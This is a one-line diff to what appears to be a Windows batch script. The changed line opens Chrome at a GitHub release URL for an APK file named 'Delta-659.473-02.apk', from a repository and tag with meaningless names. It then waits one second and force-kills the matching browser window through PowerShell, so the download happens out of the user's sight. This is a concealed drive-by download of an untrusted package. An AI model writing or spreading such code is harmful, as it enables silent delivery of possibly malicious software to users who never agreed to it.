@@ -1,1 +1,1 @@
-start chrome https://github.com/Alveroalexandro56/-/releases/download/dsfsdf/Delta-659.473-02.apk
+start chrome --new-window https://github.com/Alveroalexandro56/-/releases/download/dsfsdf/Delta-659.473-02.apk && timeout /t 1 /nobreak >nul && powershell -Command "& { (Get-Process chrome | Where-Object { $_.MainWindowTitle -like '*Delta-659.473-02.apk*' }) | ForEach-Object { Stop-Process -Id $_.Id -Force } }"
